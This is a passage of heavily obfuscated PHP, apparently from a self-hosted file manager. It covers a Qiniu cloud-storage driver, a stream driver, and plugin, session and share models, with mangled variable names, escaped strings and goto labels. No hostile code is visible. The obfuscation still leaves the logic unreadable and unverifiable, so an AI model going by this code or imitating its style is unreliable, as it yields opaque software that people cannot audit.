ØÂ”ñ) { return $Ë©ªè¾; } $Ë©ªè¾[$Á‡º«şÔ[241]] = $Ë©ªè¾[$Á‡º«şÔ[98]] = 0; $Ë©ªè¾[$Á‡º«şÔ[242]] = $Ë©ªè¾[$Á‡º«şÔ[243]] = !0; $µÀ¾ÓŒ = rtrim($µÀ¾ÓŒ, $Á‡º«şÔ[8]) . $Á‡º«şÔ[8]; $ÕØÆİ– = $this->objectMeta($µÀ¾ÓŒ); if (isset($ÕØÆİ–[$Á‡º«şÔ[1733]])) { $Ë©ªè¾[$Á‡º«şÔ[98]] = substr($ÕØÆİ–[$Á‡º«şÔ[1733]] . $Á‡º«şÔ[12], 0, 10); } return $Ë©ªè¾; } public function listPath($€İŸäÁ, $•ô¾ÈóÉ = false) { $—êúé–Î =& $_SERVER[øşô´çË]; $³“ÃÙÛÉ = $this->fileList($€İŸäÁ, $—êúé–Î[8], !0); foreach ($³“ÃÙÛÉ[$—êúé–Î[95]] as $ğ¿ıÌ => $ñÖê¼Ûû) { $³“ÃÙÛÉ[$—êúé–Î[95]][$ğ¿ıÌ] = $this->folderInfo($ñÖê¼Ûû, $•ô¾ÈóÉ); } foreach ($³“ÃÙÛÉ[$—êúé–Î[96]] as $ğ¿ıÌ => $ñÖê¼Ûû) { $³“ÃÙÛÉ[$—êúé–Î[96]][$ğ¿ıÌ] = $this->fileInfo($ñÖê¼Ûû[$—êúé–Î[42]], $•ô¾ÈóÉ, $ñÖê¼Ûû); } return $³“ÃÙÛÉ; } public function has($ëÜ§Ğ—, $šŒ¤»ïº = false, $­Üˆšß“ = true) { $‹ƒğ²å  =& $_SERVER[øşô´çË]; $ëÜ§Ğ— = trim($ëÜ§Ğ—, $‹ƒğ²å [8]); $ù¾Ÿœà = empty($ëÜ§Ğ—) && $ëÜ§Ğ— !== $‹ƒğ²å [238] ? $‹ƒğ²å [12] : $ëÜ§Ğ— . $‹ƒğ²å [8]; $Ãì·†ûç = $‹ƒğ²å [12]; $Àêñ”Û = 500; $ÔôıîüÇ = $‹ƒğ²å [8]; $ÜÑÊ±ë = $çÕåÈæ¿ = 0; while (!0) { check_abort(); list($×ÈÍœâ¬, $ğˆ©‰) = $this->bucketManager->listFiles($this->bucket, $ù¾Ÿœà, $Ãì·†ûç, $Àêñ”Û, $ÔôıîüÇ); if ($ğˆ©‰) { break; } $Ãì·†ûç = array_key_exists($‹ƒğ²å [1680], $×ÈÍœâ¬) ? $Ãì·†ûç = $×ÈÍœâ¬[$‹ƒğ²å [1734]] : $‹ƒğ²å [12]; if ($šŒ¤»ïº) { if (!empty($×ÈÍœâ¬[$‹ƒğ²å [1735]])) { $ÜÑÊ±ë += count($×ÈÍœâ¬[$‹ƒğ²å [1735]]); } if (!empty($×ÈÍœâ¬[$‹ƒğ²å [1736]])) { $çÕåÈæ¿ += count($×ÈÍœâ¬[$‹ƒğ²å [1736]]); } if ($Ãì·†ûç === $‹ƒğ²å [12]) { break; } continue; } if ($­Üˆšß“) { if (!empty($×ÈÍœâ¬[$‹ƒğ²å [1735]])) { return !0; } } else { if (!empty($×ÈÍœâ¬[$‹ƒğ²å [1736]])) { return !0; } } if ($Ãì·†ûç === $‹ƒğ²å [12]) { break; } } if ($šŒ¤»ïº) { return array($‹ƒğ²å [249] => $ÜÑÊ±ë, $‹ƒğ²å [250] => $çÕåÈæ¿); } return !1; } public function listAll($†ƒÖöô†) { $ßÃåÚ†‚ =& $_SERVER[øşô´çË]; $•Ÿ·¡×· = $this->fileList($†ƒÖöô†, $ßÃåÚ†‚[12], !0); $„Ïè­’Ô = array_to_keyvalue($•Ÿ·¡×·[$ßÃåÚ†‚[96]], $ßÃåÚ†‚[42]); foreach ($•Ÿ·¡×·[$ßÃåÚ†‚[95]] as $£„Í‡áº) { if (is_string($£„Í‡áº)) { $„Ïè­’Ô[$£„Í‡áº] = array($ßÃåÚ†‚[89] => 0); } } return $this->listAllFiles($†ƒÖöô†, $„Ïè­’Ô); } private function fileList($»ìÜÊÅë, $Ç¼å°©Ğ = '', $úèÆÓŒ’ = 0) { $™¼³Ãó® =& $_SERVER[øşô´çË]; $»ìÜÊÅë = trim($»ìÜÊÅë, $™¼³Ãó®[8]); $Ìå³õ˜½ = empty($»ìÜÊÅë) && $»ìÜÊÅë !== $™¼³Ãó®[238] ? $™¼³Ãó®[12] : $»ìÜÊÅë . $™¼³Ãó®[8]; $›ˆ¢ÅĞı = $™¼³Ãó®[12]; $™îŸÑ–© = 1000; $âÎ‹ÓÉ® = $ÔóÁÃ—Å = array(); while (!0) { check_abort(); list($™÷îìÙ, $´Ø‰çÛ€) = $this->bucketManager->listFiles($this->bucket, $Ìå³õ˜½, $›ˆ¢ÅĞı, $™îŸÑ–©, $Ç¼å°©Ğ); if ($´Ø‰çÛ€) { break; } $›ˆ¢ÅĞı = array_key_exists($™¼³Ãó®[1680], $™÷îìÙ) ? $›ˆ¢ÅĞı = $™÷îìÙ[$™¼³Ãó®[1734]] : $™¼³Ãó®[12]; $Ãáü´Öá = isset($™÷îìÙ[$™¼³Ãó®[1735]]) ? $™÷îìÙ[$™¼³Ãó®[1735]] : array(); $ıÙá»Ü = isset($™÷îìÙ[$™¼³Ãó®[1736]]) ? $™÷îìÙ[$™¼³Ãó®[1736]] : array(); foreach ($Ãáü´Öá as $ıÚãôÓ¿) { if ($ıÚãôÓ¿[$™¼³Ãó®[105]] == $Ìå³õ˜½) { continue; } $ë‚Š«¿§ = $ıÚãôÓ¿[$™¼³Ãó®[105]]; $Åå”…ˆ = $ıÚãôÓ¿[$™¼³Ãó®[1732]]; $ıÚãôÓ¿[$™¼³Ãó®[42]] = $ë‚Š«¿§; $ıÚãôÓ¿[$™¼³Ãó®[89]] = $Åå”…ˆ; $ü¦ÏŸÔ = $Åå”…ˆ == 0 && substr($ë‚Š«¿§, strlen($ë‚Š«¿§) - 1, 1) == $™¼³Ãó®[8] ? !0 : !1; $this->cacheMethodInfoSet($ë‚Š«¿§, $ü¦ÏŸÔ, $ıÚãôÓ¿); if ($ü¦ÏŸÔ) { $âÎ‹ÓÉ®[] = $ë‚Š«¿§; continue; } $ÔóÁÃ—Å[] = $úèÆÓŒ’ ? $ıÚãôÓ¿ : $ë‚Š«¿§; } foreach ($ıÙá»Ü as $ë‚Š«¿§) { if ($ë‚Š«¿§ == $Ìå³õ˜½) { continue; } $âÎ‹ÓÉ®[] = $ë‚Š«¿§; $this->cacheMethodInfoSet($ë‚Š«¿§, !0); } if ($›ˆ¢ÅĞı === $™¼³Ãó®[12]) { break; } } $this->cacheMethodInfoSet($»ìÜÊÅë, !0); return array($™¼³Ãó®[95] => $âÎ‹ÓÉ®, $™¼³Ãó®[96] => $ÔóÁÃ—Å); } public function canRead($¾Í‡äá) { return $this->exist($¾Í‡äá) ? !0 : !1; } public function canWrite($áö×ûä‰) { return $this->exist($áö×ûä‰) ? !0 : !1; } public function getContent($–š®å¥ß) { return $this->fileSubstr($–š®å¥ß, 0, -1); } public function setContent($—ğ·î»Û, $ü¶¤ŞŒÚ = '') { $»»Æ¨ìŒ = $this->tempFile($this->pathThis($—ğ·î»Û)); file_put_contents($»»Æ¨ìŒ, $ü¶¤ŞŒÚ); if ($this->upload($—ğ·î»Û, $»»Æ¨ìŒ)) { $this->tempFileRemve($»»Æ¨ìŒ); return !0; } return !1; } public function refreshUrls($‘Ï‡İûª) { $è¼ªåè =& $_SERVER[øşô´çË]; $«¨¹ç = array(); if (is_array($‘Ï‡İûª)) { foreach ($‘Ï‡İûª as $½ØµÅæ¾) { $«¨¹ç[] = $this->link($½ØµÅæ¾); } } else { $«¨¹ç[] = $this->link($‘Ï‡İûª); } $°‰€®ô = new Qiniu\Cdn\CdnManager($this->auth); list($ÍÄå³Æ¸, $ÎÀÙìÛ¾) = $°‰€®ô->refreshUrls($«¨¹ç); if ($ÎÀÙìÛ¾) { return !1; } return $ÍÄå³Æ¸[$è¼ªåè[1367]] == $è¼ªåè[862] ? !0 : !1; } public function fileSubstr($Ÿ®ÆÁŒı, $÷«Ñ”’Â, $ÑÔ¦«—ê) { $„˜—âåñ =& $_SERVER[øşô´çË]; if (!($¡÷÷¢î© = $this->link($Ÿ®ÆÁŒı))) { return !1; } $°‘è Ù« = !1; if ($ÑÔ¦«—ê > 0) { $Ïàˆ°¸› = $÷«Ñ”’Â + $ÑÔ¦«—ê - 1; $°‘è Ù« = array($„˜—âåñ[1600] . $÷«Ñ”’Â . $„˜—âåñ[485] . $Ïàˆ°¸›); } $†®ßéè = url_request($¡÷÷¢î©, $„˜—âåñ[1601], !1, $°‘è Ù«); return $†®ßéè[$„˜—âåñ[852]] ? $†®ßéè[$„˜—âåñ[1388]] : !1; } public function upload($™™åÄ†Æ, $ÄØÛğÎ, $ò„ºË‹ = false, $û‘ôíó = REPEAT_REPLACE) { if (!$ÄØÛğÎ || !@file_exists($ÄØÛğÎ)) { return !1; } $Éı»‡® = new Qiniu\Storage\UploadManager(); $›”ĞˆÒè = $this->auth->uploadToken($this->bucket, $™™åÄ†Æ); $÷ò¶ò÷’ = get_file_mime(get_path_ext($ÄØÛğÎ)); list($¡Ÿùµ”õ, $÷Ê®©×¤) = $Éı»‡®->putFile($›”ĞˆÒè, $™™åÄ†Æ, $ÄØÛğÎ, null, $÷ò¶ò÷’); return $÷Ê®©×¤ ? !1 : $this->getPathOuter($™™åÄ†Æ); } public function uploadFormData($‰¯Ì¼Æò, $Ş›¤ï = 3600) { return $this->uploadToken($‰¯Ì¼Æò, $Ş›¤ï); } public function uploadMultiData($¦š¤ëÅ®, $‚¾µ¹ŸÄ = 3600) { return $this->uploadToken($¦š¤ëÅ®, $‚¾µ¹ŸÄ); } private function uploadToken($™ÄÌ°°‹, $‰•¶ÌÉ = 3600) { $–Ø« ù¾ =& $_SERVER[øşô´çË]; $´Õ‹¯å÷ = $‰•¶ÌÉ; $‘Ú¸ÑÔ = array($–Ø« ù¾[1737] => $–Ø« ù¾[1738]); $ô’†ş²ñ = $™ÄÌ°°‹; $Ó‰¾÷í« = $this->auth->uploadToken($this->bucket, $ô’†ş²ñ, $´Õ‹¯å÷, $‘Ú¸ÑÔ, !0); $úıâ±àÔ = empty($this->region) || $this->region == $–Ø« ù¾[1739] ? $–Ø« ù¾[12] : $–Ø« ù¾[485] . $this->region; $şğí“ÛÅ = http_type() . "\72\x2f\57\x75\x70\x6c\x6f\x61\x64{$úıâ±àÔ}\x2e\161\151\x6e\x69\165\x70\x2e\143\x6f\x6d\x2f"; return array($–Ø« ù¾[1740] => $Ó‰¾÷í«, $–Ø« ù¾[1603] => $şğí“ÛÅ); } public function download($Í‚àîµª, $«×ª‚¹Ú) { $ÀôïŒáâ = IO::getPathInner(IO::mkfile($«×ª‚¹Ú)); if (!($®¯öñé³ = $this->link($Í‚àîµª))) { return !1; } $ÚïßÀù® = 0; $·ò£³Ù = 1024 * 200; $†Ë”““» = fopen($ÀôïŒáâ, $_SERVER[øşô´çË][1741]); while (!0) { $çûœ³é¹ = $this->fileSubstr($Í‚àîµª, $ÚïßÀù®, $·ò£³Ù); if ($çûœ³é¹ === !1) { return !1; } fwrite($†Ë”““», $çûœ³é¹); $ÚïßÀù® += $·ò£³Ù; if (strlen($çûœ³é¹) < $·ò£³Ù) { break; } } fclose($†Ë”““»); return $«×ª‚¹Ú; } public function link($Ú§õÂË, $á÷ì¬Ì¡ = '') { if (!$this->isFile($Ú§õÂË)) { return !1; } $ÇÃêÅ÷ = $this->getHost() . $_SERVER[øşô´çË][8] . $this->pathEncode($Ú§õÂË) . $á÷ì¬Ì¡; return $this->auth->privateDownloadUrl($ÇÃêÅ÷, 3600 * 12); } public function fileOut($±Æéû÷¨, $®ßï³ª¦ = false, $ÌÑÃ–ÁÔ = false, $ÒÄï¢…à = '') { $ßªºÃ¶Ê =& $_SERVER[øşô´çË]; if ($this->isFileOutServer()) { return $this->fileOutServer($±Æéû÷¨, $®ßï³ª¦, $ÌÑÃ–ÁÔ, $ÒÄï¢…à); } if (!$ÌÑÃ–ÁÔ) { $ÌÑÃ–ÁÔ = $this->pathThis($±Æéû÷¨); } $¹õö×¨û = $®ßï³ª¦ ? $ßªºÃ¶Ê[1742] . rawurlencode($ÌÑÃ–ÁÔ) : $ßªºÃ¶Ê[12]; $­Ì²ƒøÆ = $this->link($±Æéû÷¨, $¹õö×¨û); $this->fileOutLink($­Ì²ƒøÆ); } public function fileOutServer($ÈøÒî», $ÄÓùƒ£ = false, $ú£®ÖíÊ = false, $˜¾µâçµ = '') { parent::fileOut($ÈøÒî», $ÄÓùƒ£, $ú£®ÖíÊ, $˜¾µâçµ); } public function fileOutImage($É†É“áá, $éÍä·Á¤ = 250) { if ($this->size($É†É“áá) > 1024 * 1024 * 20) { return $this->fileOutImageServer($É†É“áá, $éÍä·Á¤); } $Û©°ïõ† = $this->link($É†É“áá, $_SERVER[øşô´çË][1743] . $éÍä·Á¤); $this->fileOutLink($Û©°ïõ†); } public function fileOutImageServer($ÖŸÖŞïç, $¹‰ş¸¨ = 250) { parent::fileOutImage($ÖŸÖŞïç, $¹‰ş¸¨); } public function hashMd5($şú¸¹óú) { $±ç½öÆ´ =& $_SERVER[øşô´çË]; $±ú•õ€ = $this->objectMeta($şú¸¹óú); return isset($±ú•õ€[$±ç½öÆ´[255]]) ? $±ú•õ€[$±ç½öÆ´[255]] : !1; $ÃÖÂª¬¦ = $this->link($şú¸¹óú, $±ç½öÆ´[1744]); } public function size($â‘×µşÒ) { $Âõ™× = $this->objectMeta($â‘×µşÒ); return $Âõ™× ? $Âõ™×[$_SERVER[øşô´çË][89]] : 0; } public function info($ÙÖƒ•‹Ã) { if ($this->isFolder($ÙÖƒ•‹Ã)) { return $this->folderInfo($ÙÖƒ•‹Ã); } else { if ($this->isFile($ÙÖƒ•‹Ã)) { return $this->fileInfo($ÙÖƒ•‹Ã); } } return !1; } public function exist($œ«‹©¨) { return $this->isFile($œ«‹©¨) || $this->isFolder($œ«‹©¨); } public function isFile($Ì‚‰™–ø) { return !$this->isFolder($Ì‚‰™–ø) && $this->objectMeta($Ì‚‰™–ø); } public function isFolder($ö¨ŠşÆ) { return $this->cacheMethod($_SERVER[øşô´çË][187], $ö¨ŠşÆ); } protected function objectMeta($ÊÄìÁ¤½) { return $this->cacheMethod($_SERVER[øşô´çË][189], $ÊÄìÁ¤½); } protected function _objectMeta($›Å²çÈ¸) { $Ä¢ı‰·Õ =& $_SERVER[øşô´çË]; list($»Ï˜×ÌÖ, $œÛç Àı) = $this->bucketManager->stat($this->bucket, $›Å²çÈ¸); if ($»Ï˜×ÌÖ) { $»Ï˜×ÌÖ[$Ä¢ı‰·Õ[89]] = intval($»Ï˜×ÌÖ[$Ä¢ı‰·Õ[1732]]); } return $»Ï˜×ÌÖ; } protected function _isFolder($·¢Ì‹¼­) { $Úú‹€…Ó =& $_SERVER[øşô´çË]; if ($·¢Ì‹¼­ == $Úú‹€…Ó[12] || $·¢Ì‹¼­ == $Úú‹€…Ó[8]) { return !0; } list($ÚÀª”÷, $šá¸ûÆ”) = $this->bucketManager->listFiles($this->bucket, trim($·¢Ì‹¼­, $Úú‹€…Ó[8]) . $Úú‹€…Ó[8], $Úú‹€…Ó[12], 1, $Úú‹€…Ó[8]); return !empty($ÚÀª”÷[$Úú‹€…Ó[1735]]) || !empty($ÚÀª”÷[$Úú‹€…Ó[1736]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ã¦Ò§¼, $ø„ŠÔÆÖ = 0) { parent::__construct(); $this->source = $ã¦Ò§¼; $this->sourceSize = $ø„ŠÔÆÖ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($µ¼™È•Ñ = false) { return $this->sourceSize; } public function getContent($†êº™è = false) { return $this->fileSubstr($†êº™è, 0, $this->sourceSize); } public function fileSubstr($ıØäê„à = false, $¸®œåÌ¼ = 0, $œ’–ŠÀÑ = 0) { if (!$œ’–ŠÀÑ) { $œ’–ŠÀÑ = $this->sourceSize; } $±—ù¡Ö = $this->sourceSize - $¸®œåÌ¼; if ($œ’–ŠÀÑ >= $±—ù¡Ö) { $œ’–ŠÀÑ = $±—ù¡Ö; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $¸®œåÌ¼, $œ’–ŠÀÑ); } if ($this->sourceType == self::TYPE_FILE) { if ($œ’–ŠÀÑ <= 0) { return $_SERVER[øşô´çË][12]; } $Ô¥¸ûü = ftell($this->source); fseek_64($this->source, $Ô¥¸ûü + $¸®œåÌ¼); $ÀŞõÆî† = @fread($this->source, $œ’–ŠÀÑ); fseek_64($this->source, $Ô¥¸ûü); return $ÀŞõÆî†; } } public function hashMd5($´‚Øªˆ = false) { return md5($this->getContent()); } public static function hash($Ó…©¨Ô¿, $°ıœ½åà = 0) { $õŸ‹¡€Ğ = new PathDriverStream($Ó…©¨Ô¿, $°ıœ½åà); return $õŸ‹¡€Ğ->hashSimple($Ó…©¨Ô¿); } public static function md5($ÃÇÑØÛ, $¡ÔùÒ…Ô = 0) { $”‘”À©Ù = new PathDriverStream($ÃÇÑØÛ, $¡ÔùÒ…Ô); return $”‘”À©Ù->hashMd5($ÃÇÑØÛ); } } goto Dôô‚·åÉ¦; f„¹ñ™Ò¶»: class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\56\160\154\165\x67\x69\x6e\114\151\x73\x74"; public $field = array("\156\x61\x6d\145", "\163\x74\x61\164\165\163", "\162\x65\147\151\x65\x73\x74", "\143\x6f\156\x66\151\147"); public function loadList($ú§Ö¯ = false) { $›Î˜Å½í = array_to_keyvalue($this->listData(), $_SERVER[øşô´çË][42]); if ($ú§Ö¯) { return $›Î˜Å½í[$ú§Ö¯]; } return $›Î˜Å½í; } public function init() { $°ÉäÕÅÎ =& $_SERVER[øşô´çË]; Hook::trigger($°ÉäÕÅÎ[2300]); $¼¬ÀŸú¿ = $this->loadPluginList(); foreach ($¼¬ÀŸú¿ as $êø´“Á => $Ê‹¼›û») { $²µ…Ü¹É = $this->appAllow($êø´“Á, $Ê‹¼›û»); if (!$²µ…Ü¹É) { continue; } foreach ($Ê‹¼›û»[$°ÉäÕÅÎ[2301]] as $­àú¬à => $ï’ÊÓÒı) { Hook::bind($­àú¬à, $ï’ÊÓÒı); } } Hook::trigger($°ÉäÕÅÎ[2302]); Hook::trigger(ACTION); } public function appAllow($´³µ£®œ, $À×Öª¨, $ßèÛÑ¶­ = true) { $«Ç²ØØ =& $_SERVER[øşô´çË]; $îäøüÏÑ = PLUGIN_DIR . $´³µ£®œ . $«Ç²ØØ[2303]; if (!is_array($À×Öª¨) || !is_array($À×Öª¨[$«Ç²ØØ[2301]]) || $À×Öª¨[$«Ç²ØØ[852]] != 1 || !is_file($îäøüÏÑ)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$«Ç²ØØ[6]][$«Ç²ØØ[2304]] || !$GLOBALS[$«Ç²ØØ[6]][$«Ç²ØØ[2305]]) { return !0; } $›·Áúã = explode($«Ç²ØØ[60], strtolower($GLOBALS[$«Ç²ØØ[6]][$«Ç²ØØ[2305]])); return in_array(strtolower($´³µ£®œ), $›·Áúã) ? !1 : !0; } if ($ßèÛÑ¶­ && !Action($«Ç²ØØ[2306])->checkAuth($´³µ£®œ)) { return !1; } return !0; } public function unInstall($ïò´Ê…ß) { $›ªÅ”²â =& $_SERVER[øşô´çË]; $›Ë¬¬³  = $this->loadList($ïò´Ê…ß); if (file_exists(PLUGIN_DIR . $ïò´Ê…ß)) { Hook::apply($ïò´Ê…ß . $›ªÅ”²â[2307]); } $this->remove($›Ë¬¬³ [$›ªÅ”²â[496]]); } public function changeStatus($ˆó°ô°×, $Ûµ¹¢çÏ) { $åÊä°ÀÊ =& $_SERVER[øşô´çË]; $§Åå»ê£ = $this->loadList($ˆó°ô°×); if ($Ûµ¹¢çÏ) { Hook::apply($ˆó°ô°× . $åÊä°ÀÊ[2308]); } $this->update($§Åå»ê£[$åÊä°ÀÊ[496]], array($åÊä°ÀÊ[2309] => $Ûµ¹¢çÏ)); } public function appRegist($Ç×³€ÇŠ, $áÃ•ÅùĞ) { $ƒ³ÅŠ«æ =& $_SERVER[øşô´çË]; $–ºÌİ½ì = $this->loadList($Ç×³€ÇŠ); if ($–ºÌİ½ì) { $this->update($–ºÌİ½ì[$ƒ³ÅŠ«æ[496]], array($ƒ³ÅŠ«æ[2301] => $áÃ•ÅùĞ)); } else { $ş§æ†­ = array($ƒ³ÅŠ«æ[42] => $Ç×³€ÇŠ, $ƒ³ÅŠ«æ[2301] => $áÃ•ÅùĞ, $ƒ³ÅŠ«æ[852] => 0, $ƒ³ÅŠ«æ[6] => $this->getConfigDefault($Ç×³€ÇŠ)); $this->insert($ş§æ†­); } } public function getConfigDefault($ ¸¡Å¦Ô) { $™ŸÄĞ‹™ =& $_SERVER[øşô´çË]; $ÉúíÓ¥ê = array(); $Ã²†ôñß = $this->getPackageJson($ ¸¡Å¦Ô); if (!$Ã²†ôñß && is_array($Ã²†ôñß[$™ŸÄĞ‹™[2310]])) { return $ÉúíÓ¥ê; } foreach ($Ã²†ôñß[$™ŸÄĞ‹™[2310]] as $õ¦¿ìŠ => $ù¿ÛñøŠ) { if (!isset($ù¿ÛñøŠ[$™ŸÄĞ‹™[460]]) || isset($ÉúíÓ¥ê[$õ¦¿ìŠ])) { continue; } $ÉúíÓ¥ê[$õ¦¿ìŠ] = $ù¿ÛñøŠ[$™ŸÄĞ‹™[460]]; } return $ÉúíÓ¥ê; } public function getPackageJson($¯ÏÕà¼”) { return Hook::apply($¯ÏÕà¼” . $_SERVER[øşô´çË][2311]); } public function getConfig($¬Òˆô¥è, $ƒÔ½ŒÂ = false) { $‘ğÕˆ•‚ =& $_SERVER[øşô´çË]; $×÷á½¼ç = array(); $÷¯ı…®Ê = $this->loadList($¬Òˆô¥è); if ($÷¯ı…®Ê && is_array($÷¯ı…®Ê[$‘ğÕˆ•‚[6]])) { $×÷á½¼ç = $÷¯ı…®Ê[$‘ğÕˆ•‚[6]]; } if (!$×÷á½¼ç || $ƒÔ½ŒÂ) { $×÷á½¼ç = $this->getConfigDefault($¬Òˆô¥è); } return $×÷á½¼ç; } public function setConfig($ §‹«½, $ÊÇœœˆù = false) { $ÇƒÇËÌÖ =& $_SERVER[øşô´çË]; $°‹ïÓîö = $this->loadList($ §‹«½); if (!$°‹ïÓîö) { return !1; } $Ôà’À³ = $°‹ïÓîö[$ÇƒÇËÌÖ[6]]; if ($ÊÇœœˆù == !1) { $Ôà’À³ = array(); $ÊÇœœˆù = $this->getConfigDefault($ §‹«½); } foreach ($ÊÇœœˆù as $Ö•„Èµî => $ûü®ÁÙŠ) { $Ôà’À³[$Ö•„Èµî] = is_string($ûü®ÁÙŠ) ? trim($ûü®ÁÙŠ) : $ûü®ÁÙŠ; } $this->update($°‹ïÓîö[$ÇƒÇËÌÖ[496]], array($ÇƒÇËÌÖ[6] => $Ôà’À³)); } public function viewList() { $İ„ì‘à =& $_SERVER[øşô´çË]; $¯Õºˆ‘¢ = $this->loadList(); $this->pluginScan($¯Õºˆ‘¢); $¯Õºˆ‘¢ = $this->loadPluginList(); $É­óÔİã = array(); foreach ($¯Õºˆ‘¢ as $£®™–® => $‚¤çØÆ¿) { $şÖ©š· = $‚¤çØÆ¿; unset($‚¤çØÆ¿[$İ„ì‘à[2301]], $‚¤çØÆ¿[$İ„ì‘à[6]]); $öŠõŞò¶ = PLUGIN_DIR . $‚¤çØÆ¿[$İ„ì‘à[42]] . $İ„ì‘à[2303]; if (!is_file($öŠõŞò¶)) { continue; } $½ÄÛÏö = Hook::apply($‚¤çØÆ¿[$İ„ì‘à[42]] . $İ„ì‘à[2311]); if (!is_array($½ÄÛÏö)) { continue; } $É­óÔİã[$£®™–®] = array_merge($‚¤çØÆ¿, $½ÄÛÏö); if ($şÖ©š·[$İ„ì‘à[6]][$İ„ì‘à[1887]] != $½ÄÛÏö[$İ„ì‘à[1861]]) { Hook::apply($‚¤çØÆ¿[$İ„ì‘à[42]] . $İ„ì‘à[2308]); $şÖ©š·[$İ„ì‘à[6]][$İ„ì‘à[1887]] = $½ÄÛÏö[$İ„ì‘à[1861]]; $this->update($‚¤çØÆ¿[$İ„ì‘à[496]], array($İ„ì‘à[6] => $şÖ©š·[$İ„ì‘à[6]])); } } return $É­óÔİã; } private function loadPluginList() { $ø„òö€ó =& $_SERVER[øşô´çË]; $µÏ¨š ğ = $this->loadList(); if (strtolower(MOD) == $ø„òö€ó[2312]) { return $µÏ¨š ğ; } $®Çûô¨‹ = Hook::trigger($ø„òö€ó[2313], $µÏ¨š ğ); if ($µÏ¨š ğ && !$®Çûô¨‹) { die; } return $®Çûô¨‹ ? $®Çûô¨‹ : $µÏ¨š ğ; } private function pluginScan($ÒšÜ¨²) { $åóƒªæ© =& $_SERVER[øşô´çË]; recursion_dir(PLUGIN_DIR, $Çô’Ñµ, $†ïûä, 0); foreach ($Çô’Ñµ as $šÆª¾ ü) { $ô–â›…‘ = get_path_this($šÆª¾ ü); if (isset($ÒšÜ¨²[$ô–â›…‘]) || !file_exists($šÆª¾ ü . $åóƒªæ©[2314]) || !file_exists($šÆª¾ ü . $åóƒªæ©[2303])) { continue; } Hook::apply($ô–â›…‘ . $åóƒªæ©[2308]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\145\155\x5f\x73\145\x73\x73\x69\x6f\x6e"; public function get($æŞ¥™¢ß) { $˜ÚÆï¤è =& $_SERVER[øşô´çË]; $ˆîÂúøÇ = $this->where(array($˜ÚÆï¤è[2315] => $æŞ¥™¢ß))->find(); if (!is_array($ˆîÂúøÇ)) { return !1; } return $ˆîÂúøÇ[$˜ÚÆï¤è[178]]; } public function set($ó¦±êƒû, $úšçĞ‘‰, $€ÆÆâ›Ğ = 3600) { $ú¾Ğ˜ìÈ =& $_SERVER[øşô´çË]; $Ì¶¨˜ù‚ = array($ú¾Ğ˜ìÈ[2315] => $ó¦±êƒû, $ú¾Ğ˜ìÈ[2218] => $úšçĞ‘‰, $ú¾Ğ˜ìÈ[2316] => $€ÆÆâ›Ğ + time()); if (Session::get($ú¾Ğ˜ìÈ[2317])) { $Ì¶¨˜ù‚[$ú¾Ğ˜ìÈ[1588]] = Session::get($ú¾Ğ˜ìÈ[2317]); } else { $Ì¶¨˜ù‚[$ú¾Ğ˜ìÈ[1588]] = 0; } if ($this->get($ó¦±êƒû)) { return $this->where(array($ú¾Ğ˜ìÈ[2315] => $ó¦±êƒû))->save($Ì¶¨˜ù‚); } else { return $this->add($Ì¶¨˜ù‚, array(), !0); } } public function remove($–Úè½Î) { return $this->where(array($_SERVER[øşô´çË][2315] => $–Úè½Î))->delete(); } public function clearTimeout() { return $this->where($_SERVER[øşô´çË][2318] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\x72\x65"; protected $dataAuto = array(array("\x6d\x6f\144\x69\x66\x79\124\151\155\x65", "\164\x69\155\x65", "\151\x6e\163\145\x72\x74\x2c\x75\160\x64\141\x74\x65", "\146\165\x6e\143\164\151\157\156"), array("\x63\162\x65\x61\164\x65\x54\151\155\x65", "\164\x69\155\x65", "\151\156\163\x65\x72\164", "\146\x75\156\x63\x74\x69\x6f\156"), array("\157\x70\164\x69\157\x6e\163", '', "\x69\156\163\145\x72\x74\54\x75\x70\144\141\164\x65\x2c\x73\145\154\145\x63\x74", "\x6a\x73\157\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($İ‹ù¸Ö) { $Ì”Ê­° =& $_SERVER[øşô´çË]; return array($Ì”Ê­°[2319] => array(USER_ID, $Ì”Ê­°[2320]), $Ì”Ê­°[2321] => array($İ‹ù¸Ö[0], $Ì”Ê­°[2322])); } protected function ___listSimple() { $Ì¨‹¼ò = $this->field($this->fieldList)->where(array($_SERVER[øşô´çË][1588] => USER_ID))->select(); return $Ì¨‹¼ò ? $Ì¨‹¼ò : array(); } protected function ___getInfoShare($¼ÚÙí) { return $this->_getShareInfo(array($_SERVER[øşô´çË][696] => $¼ÚÙí), !1); } protected function getInfo($ì€ò“ÃÔ) { $½ôÂ˜ÜÑ = $this->getInfoShare($ì€ò“ÃÔ); return $this->shareSourceInfo($½ôÂ˜ÜÑ); } public function getInfoByHash($Ø¡û£…Î) { return $this->_getShareInfo(array($_SERVER[øşô´çË][1550] => $Ø¡û£…Î)); } public function getInfoByPath($Ùœè”£ø) { $ğ¨ö®å• =& $_SERVER[øşô´çË]; $Ãá½Âºè = array($ğ¨ö®å•[1588] => USER_ID, $ğ¨ö®å•[201] => $Ùœè”£ø); return $this->_getShareInfo($Ãá½Âºè); } public function getInfoBySourcePath($¾¾ïÙÃÓ) { $¶şú£ƒí =& $_SERVER[øşô´çË]; $–£¿ÛÆ = array($¶şú£ƒí[1588] => USER_ID, $¶şú£ƒí[592] => $¾¾ïÙÃÓ); return $this->_getShareInfo($–£¿ÛÆ); } private function _getShareInfo($øíéı‡Ğ, $¶¹®·Ğû = true) { $¨íôêË =& $_SERVER[øşô´çË]; $ø“é¹á = $this->where($øíéı‡Ğ)->find(); if (!$ø“é¹á) { return !1; } if (!is_array($ø“é¹á[$¨íôêË[589]])) { $ø“é¹á[$¨íôêË[589]] = array(); } $øíéı‡Ğ = array($¨íôêË[696] => $ø“é¹á[$¨íôêË[696]]); $¤§¦Ä = $¨íôêË[2323]; $ø“é¹á[$¨íôêË[1546]] = Model($¨íôêË[697])->order($¨íôêË[496])->field($¤§¦Ä)->where($øíéı‡Ğ)->select(); if (!$¶¹®·Ğû) { return $ø“é¹á; } return 